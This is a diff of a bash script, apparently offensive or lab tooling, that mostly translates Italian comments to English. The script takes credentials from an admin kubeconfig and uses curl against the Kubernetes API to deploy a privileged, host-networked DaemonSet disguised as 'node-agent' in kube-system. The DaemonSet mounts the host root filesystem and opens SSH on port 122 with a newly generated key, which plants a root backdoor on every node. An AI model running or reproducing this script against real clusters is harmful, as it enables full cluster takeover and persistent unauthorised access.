@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# === Parametri ===
+# === Parameters ===
 KUBECONFIG_PATH="${KUBECONFIG_PATH:-$DATA_PATH/KC6/ops-admin.kubeconfig}"
 NAMESPACE="${NAMESPACE:-kube-system}"
 DS_NAME="${DS_NAME:-node-agent}"
@@ -11,19 +11,19 @@ ARGS="${ARGS:-echo \"hello from $(/bin/hostname)\"; while true; do sleep 60; don
 
 apt update && apt install yq -y
 
-# === Requisiti ===
+# === Requirements ===
 for bin in yq jq base64; do
   command -v "$bin" >/dev/null 2>&1 || { echo "[-] Serve '$bin' nel PATH"; exit 1; }
 done
 
-# === Estrai endpoint & credenziali dal kubeconfig ===
+# === Extracts endpoint & credentials from kubeconfig ===
 APISERVER=$(yq -r '.clusters[0].cluster.server' "$KUBECONFIG_PATH")
 CA_DATA=$(yq -r '.clusters[0].cluster."certificate-authority-data" // ""' "$KUBECONFIG_PATH")
 INSECURE=$(yq -r '.clusters[0].cluster."insecure-skip-tls-verify" // "false"' "$KUBECONFIG_PATH")
 TOKEN=$(yq -r '.users[0].user.token // ""' "$KUBECONFIG_PATH")
 CERT_DATA=$(yq -r '.users[0].user."client-certificate-data" // ""' "$KUBECONFIG_PATH")
 KEY_DATA=$(yq -r '.users[0].user."client-key-data" // ""' "$KUBECONFIG_PATH")
-SA_NAME="${SA_NAME:-ops-admin}"
+SA_NAME="ops-admin"
 SSH_PORT="122"
 
 KEY_DIR="$DATA_PATH/KC6/ssh"
@@ -34,7 +34,7 @@ PUB_KEY="${PRIV_KEY}.pub"
 mkdir -p ${KEY_DIR}
 ssh-keygen -t ed25519 -N '' -f "${PRIV_KEY}" -C "ultra-priv" >/dev/null
 AUTH_KEY="$(cat "${PUB_KEY}")"
-echo "[i] Chiave generata: ${PRIV_KEY} / ${PUB_KEY}"
+echo "[i] Key generated: ${PRIV_KEY} / ${PUB_KEY}"
 
 CURL_TLS=()
 TMP_CA=""; TMP_CERT=""; TMP_KEY=""
@@ -53,14 +53,14 @@ elif [[ -n "$CERT_DATA" && -n "$KEY_DATA" ]]; then
   TMP_KEY=$(mktemp);  echo "$KEY_DATA"  | base64 -d > "$TMP_KEY"
   CURL_TLS+=(--cert "$TMP_CERT" --key "$TMP_KEY")
 else
-  echo "[-] Nessun token o client cert nel kubeconfig"; exit 1
+  echo "[-] No token or client cert in kubeconfig"; exit 1
 fi
 
-# === Assicura il namespace ===
+# === Ensure the namespace ===
 NS_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
   "${APISERVER}/api/v1/namespaces/${NAMESPACE}" "${AUTH[@]}" "${CURL_TLS[@]}")
 if [[ "$NS_CODE" == "404" ]]; then
-  echo "[*] Creo namespace ${NAMESPACE}..."
+  echo "[*] Creating namespace ${NAMESPACE}..."
   curl -sS -X POST "${APISERVER}/api/v1/namespaces" \
     "${AUTH[@]}" "${CURL_TLS[@]}" -H 'Content-Type: application/json' -d @- >/dev/null <<EOF
 { "apiVersion":"v1", "kind":"Namespace", "metadata":{ "name":"${NAMESPACE}" } }
@@ -68,7 +68,7 @@ EOF
 fi
 
 # === Server-side apply (create/update idempotente) ===
-echo "[*] Applico DaemonSet ${DS_NAME} in ${NAMESPACE}..."
+echo "[*] Applying DaemonSet ${DS_NAME} in ${NAMESPACE}..."
 curl -sS -X PATCH \
   "${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE}/daemonsets/${DS_NAME}?fieldManager=curl&force=true" \
   "${AUTH[@]}" "${CURL_TLS[@]}" \
@@ -137,7 +137,7 @@ spec:
               value: "${SSH_PORT:-122}"
           ports:
             - name: ssh
-              containerPort: ${SSH_PORT}   # solo metadata; con hostNetwork si lega direttamente sull'host
+              containerPort: ${SSH_PORT}   # only metadata with hostNetwork
           securityContext:
             privileged: true
             allowPrivilegeEscalation: true
@@ -158,16 +158,16 @@ spec:
           hostPath: { path: /, type: Directory }
 EOF
 
-# === Verifica: elenca i Pod creati dal DaemonSet ===
-echo "[*] Pod risultanti:"
+# === Verify: list pods created by DaemonSet ===
+echo "[*] Resulting Pods:"
 PODS=$(curl -sS "${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods?labelSelector=app=${DS_NAME}" \
   "${AUTH[@]}" "${CURL_TLS[@]}")
 echo "$PODS" | jq -r '.items[] | [.metadata.name, .spec.nodeName, .status.phase] | @tsv' \
-  || echo "(nessun pod ancora schedulato)"
+  || echo "(no pod yet scheduled)"
 
-# === Cleanup temporanei ===
+# === Cleanup temp files ===
 [[ -n "$TMP_CA" ]]   && rm -f "$TMP_CA"
 [[ -n "$TMP_CERT" ]] && rm -f "$TMP_CERT" "$TMP_KEY"
 
-echo "[+] Fatto."
-echo "    Per cancellare: curl -X DELETE \"${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE}/daemonsets/${DS_NAME}\" ${AUTH:+-H 'Authorization: Bearer ***'} ..."
+echo "[+] Done"
+echo "    To delete: curl -X DELETE \"${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE}/daemonsets/${DS_NAME}\" ${AUTH:+-H 'Authorization: Bearer ***'} ..."
